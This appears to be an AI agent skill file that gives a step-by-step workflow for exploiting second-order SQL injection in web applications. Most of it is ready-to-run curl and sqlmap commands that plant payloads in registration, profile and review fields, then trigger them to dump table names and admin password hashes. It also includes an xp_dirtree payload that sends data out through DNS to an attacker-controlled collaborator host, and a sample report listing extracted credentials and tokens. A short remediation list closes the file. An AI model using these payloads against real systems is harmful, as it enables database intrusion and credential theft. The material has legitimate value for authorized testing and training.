---
name: performing-second-order-sql-injection
description: Detect and exploit second-order SQL injection vulnerabilities where malicious input is stored in a database and later executed in an unsafe SQL query during a different application operation.
domain: cybersecurity
subdomain: web-application-security
tags: [second-order-sqli, stored-sql-injection, sql-injection, database-security, web-security, blind-injection, persistent-sqli]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Second-Order SQL Injection

## When to Use
- When first-order SQL injection testing reveals proper input sanitization at storage time
- During penetration testing of applications with user-generated content stored in databases
- When testing multi-step workflows where stored data feeds subsequent database queries
- During assessment of admin panels that display or process user-submitted data
- When evaluating stored procedure execution paths that use previously stored data

## Prerequisites
- Burp Suite Professional for request tracking across application flows
- SQLMap with second-order injection support (--second-url flag)
- Understanding of SQL injection fundamentals and blind extraction techniques
- Two or more application functions (one for storing data, another for triggering execution)
- Database error message monitoring or blind technique knowledge
- Multiple user accounts for testing stored data across different contexts

## Workflow

### Step 1 — Identify Storage and Trigger Points
```bash
# Map the application to identify:
# 1. STORAGE POINTS: Where user input is saved to database
#    - User registration (username, email, address)
#    - Profile update forms
#    - Comment/review submission
#    - File upload metadata
#    - Order/booking details

# 2. TRIGGER POINTS: Where stored data is used in queries
#    - Admin panels displaying user data
#    - Report generation
#    - Search functionality using stored preferences
#    - Password reset using stored email
#    - Export/download features

# Register a user with SQL injection in the username
curl -X POST http://target.com/register \
  -d "username=admin'--&password=test123&email=test@test.com"
```

### Step 2 — Inject Payloads via Storage Points
```bash
# Store SQL injection payload in username during registration
curl -X POST http://target.com/register \
  -d "username=test' OR '1'='1'--&password=Test1234&email=test@test.com"

# Store injection in profile fields
curl -X POST http://target.com/api/profile \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "display_name=test' UNION SELECT password FROM users WHERE username='admin'--"

# Store injection in address field
curl -X POST http://target.com/api/address \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "address=123 Main St' OR 1=1--&city=Test&zip=12345"

# Store injection in comment/review
curl -X POST http://target.com/api/review \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "product_id=1&review=Great product' UNION SELECT table_name FROM information_schema.tables--"
```

### Step 3 — Trigger Execution of Stored Payloads
```bash
# Trigger via password change (uses stored username)
curl -X POST http://target.com/change-password \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "old_password=Test1234&new_password=NewPass123"

# Trigger via admin user listing
curl -H "Cookie: session=ADMIN_TOKEN" http://target.com/admin/users

# Trigger via data export
curl -H "Cookie: session=AUTH_TOKEN" http://target.com/api/export-data

# Trigger via search using stored preferences
curl -H "Cookie: session=AUTH_TOKEN" http://target.com/api/recommendations

# Trigger via report generation
curl -H "Cookie: session=ADMIN_TOKEN" "http://target.com/admin/reports?type=user-activity"
```

### Step 4 — Use SQLMap for Second-Order Injection
```bash
# SQLMap with --second-url for second-order injection
# Store payload at registration, trigger at profile page
sqlmap -u "http://target.com/register" \
  --data="username=*&password=test&email=test@test.com" \
  --second-url="http://target.com/profile" \
  --cookie="session=AUTH_TOKEN" \
  --batch --dbs

# Use --second-req for complex trigger requests
sqlmap -u "http://target.com/api/update-profile" \
  --data="display_name=*" \
  --second-req=trigger_request.txt \
  --cookie="session=AUTH_TOKEN" \
  --batch --tables

# Content of trigger_request.txt:
# GET /admin/users HTTP/1.1
# Host: target.com
# Cookie: session=ADMIN_TOKEN
```

### Step 5 — Blind Second-Order Extraction
```bash
# Boolean-based blind: Check if stored payload causes different behavior
# Store: test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
curl -X POST http://target.com/api/profile \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "display_name=test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"

# Trigger and observe response difference
curl -H "Cookie: session=AUTH_TOKEN" http://target.com/profile

# Time-based blind second-order
# Store: test'; WAITFOR DELAY '0:0:5'--
curl -X POST http://target.com/api/profile \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "display_name=test'; WAITFOR DELAY '0:0:5'--"

# Out-of-band extraction via DNS
# Store: test'; EXEC xp_dirtree '\\attacker.burpcollaborator.net\share'--
curl -X POST http://target.com/api/profile \
  -H "Cookie: session=AUTH_TOKEN" \
  -d "display_name=test'; EXEC master..xp_dirtree '\\\\attacker.burpcollaborator.net\\share'--"
```

### Step 6 — Escalate to Full Database Compromise
```bash
# Once injection is confirmed, enumerate database
# Store UNION-based payload
curl -X POST http://target.com/api/profile \
  -d "display_name=test' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--"

# Extract credentials
curl -X POST http://target.com/api/profile \
  -d "display_name=test' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--"

# Trigger execution and read results
curl http://target.com/profile
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Second-Order Injection | SQL payload stored safely, then executed unsafely in a later operation |
| Storage Point | Application function where malicious input is saved to the database |
| Trigger Point | Separate function that retrieves stored data and uses it in an unsafe query |
| Trusted Data Assumption | Developer assumes database-stored data is safe, skipping parameterization |
| Stored Procedure Chains | Injection through stored procedures that use previously saved user data |
| Deferred Execution | Payload may not execute until hours or days after initial storage |
| Cross-Context Injection | Data stored by one user triggers execution in another user's context |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| SQLMap | Automated SQL injection with --second-url support for second-order attacks |
| Burp Suite | Request tracking and comparison across storage and trigger endpoints |
| OWASP ZAP | Automated scanning with injection detection |
| Commix | Automated command injection tool supporting second-order techniques |
| Custom Python scripts | Building automated storage-and-trigger exploitation chains |
| DBeaver/DataGrip | Direct database access for verifying stored payloads |

## Common Scenarios

1. **Username-Based Attack** — Register with a SQL injection payload as username; the payload executes when an admin views the user list
2. **Password Change Exploitation** — Store injection in username; when changing password, the application uses the stored username in an unsafe UPDATE query
3. **Report Generation Attack** — Inject payload in stored data fields; triggering report generation uses stored data in aggregate queries
4. **Cross-User Injection** — Inject payload in a shared data field (comments, reviews) that triggers when another user or admin processes the data
5. **Export Function Exploit** — Inject payload in profile data that triggers during CSV/PDF export operations

## Output Format

```
## Second-Order SQL Injection Report
- **Target**: http://target.com
- **Storage Point**: POST /register (username field)
- **Trigger Point**: GET /admin/users (admin panel)
- **Database**: MySQL 8.0

### Attack Flow
1. Registered user with username: `admin' UNION SELECT password FROM users--`
2. Application stored username safely using parameterized INSERT
3. Admin panel retrieves usernames with unsafe string concatenation in SELECT
4. Injected SQL executes, revealing all user passwords in admin view

### Data Extracted
| Table | Columns | Records |
|-------|---------|---------|
| users | username, password, email | 150 |
| admin_tokens | token, user_id | 3 |

### Remediation
- Use parameterized queries for ALL database operations, including reads
- Never trust data retrieved from the database as safe
- Implement output encoding when displaying database content
- Apply least-privilege database permissions
- Enable SQL query logging for detecting injection attempts
```
